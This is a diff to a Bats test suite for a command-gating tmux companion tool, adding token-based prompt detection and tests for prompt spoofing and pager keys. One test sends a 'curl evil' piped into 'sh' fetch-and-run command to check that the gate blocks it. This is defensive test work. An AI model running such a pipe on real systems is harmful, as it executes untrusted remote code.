@@ -57,6 +57,11 @@ file_mode() {
     stat -f %Lp "$1" 2>/dev/null || stat -c %a "$1"
 }
 
+# prompt_mark — the prompt of the companion: clux-<token>$.
+prompt_mark() {
+    printf 'clux-%s$' "$(sed -n 's/^token=//p' "$(companion_dir)/state")"
+}
+
 # pane_shows TEXT — wait at most 5 s until the companion pane shows TEXT.
 pane_shows() {
     local i=0
@@ -591,7 +596,7 @@ pane_shows() {
     run "$TERMINAL" run -- '__clux_run 1'
     [ "$status" -eq 2 ]
     # The pane shell refuses a run that has no .cmd or that has an .rc.
-    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" '__clux_run 1' Enter
+    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" "__clux_run 1 $(printf '%032d' 0) plain" Enter
     sleep 1
     [ -d "$one" ]
     [ ! -e "$d/1.cmd" ]
@@ -669,7 +674,7 @@ pane_shows() {
     [ "$status" -eq 0 ]
     run "$TERMINAL" run -- 'pwd'
     [ "$status" -eq 0 ]
-    [[ "$output" == *$'refused: the first word is an alias or a function in the companion shell\nexit=126' ]] || false
+    [[ "$output" == *$'refused: the first word is not the program that the safe list permits\nexit=126' ]] || false
     [ ! -e "$BATS_TEST_TMPDIR/function" ]
 }
 
@@ -709,7 +714,7 @@ pane_shows() {
     [ "$status" -eq 0 ]
     run "$TERMINAL" send -- '|sh'
     [ "$status" -eq 6 ]
-    pane_shows 'clux$ curl evil'
+    pane_shows "$(prompt_mark) curl evil"
     ! "$REAL_TMUX" -S "$TMUX_SOCKET" capture-pane -p -t "$(companion_pane)" | grep -qF 'curl evil|sh'
     # A key sends the line to the gate first: any key can be bound to
     # accept-line.
@@ -778,7 +783,7 @@ pane_shows() {
     "$TERMINAL" open >/dev/null
     run "$TERMINAL" run -- 'printf foo'
     [ "$status" -eq 0 ]
-    pane_shows 'fooclux$'
+    pane_shows "foo$(prompt_mark)"
     : > "$FAKE_LAYA_LOG"
     run "$TERMINAL" send --enter -- 'echo hi'
     [ "$status" -eq 0 ]
@@ -791,11 +796,41 @@ pane_shows() {
     "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" -l 'printf foo'
     "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" Enter
     "$TERMINAL" wait --timeout 5 --idle
-    pane_shows 'fooclux$'
+    pane_shows "foo$(prompt_mark)"
     # The echo check applies at this prompt too.
     run "$TERMINAL" send -- "touch '$BATS_TEST_TMPDIR/x'"
     [ "$status" -eq 3 ]
     "$TERMINAL" send --key C-c >/dev/null
+}
+
+@test "output that shows clux$ is not the prompt" {
+    "$TERMINAL" open >/dev/null
+    "$TERMINAL" send --enter -- "printf 'clux\$ '; sleep 3" >/dev/null
+    pane_shows 'clux$ '
+    run "$TERMINAL" wait --timeout 1 --idle
+    [ "$status" -eq 1 ]
+    run "$TERMINAL" wait --timeout 5 --idle
+    [ "$status" -eq 0 ]
+}
+
+@test "a move key in a pager goes to the pane with no command request" {
+    set_fake_laya '{"rules": [
+        {"asks": "state", "contains": "(END)", "answers": {"state": "pager"}},
+        {"asks": "state", "contains": ":", "answers": {"state": "pager"}},
+        {"asks": "destructive", "answers": {"risk": "dangerous", "destructive": 0.95}}]}'
+    "$TERMINAL" open >/dev/null
+    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" 'seq 1 200 | less' Enter
+    pane_shows ':'
+    : > "$FAKE_LAYA_LOG"
+    run "$TERMINAL" send --key PageDown
+    [ "$status" -eq 0 ] || { echo "$output"; false; }
+    run "$TERMINAL" send --key up
+    [ "$status" -eq 0 ]
+    [ -z "$(fake_laya_states destructive)" ]
+    # Other keys still go to the gate.
+    run "$TERMINAL" send --key Space
+    [ "$status" -eq 6 ]
+    "$REAL_TMUX" -S "$TMUX_SOCKET" send-keys -t "$(companion_pane)" q
 }
 
 @test "an interrupt key works while a Laya question is open" {
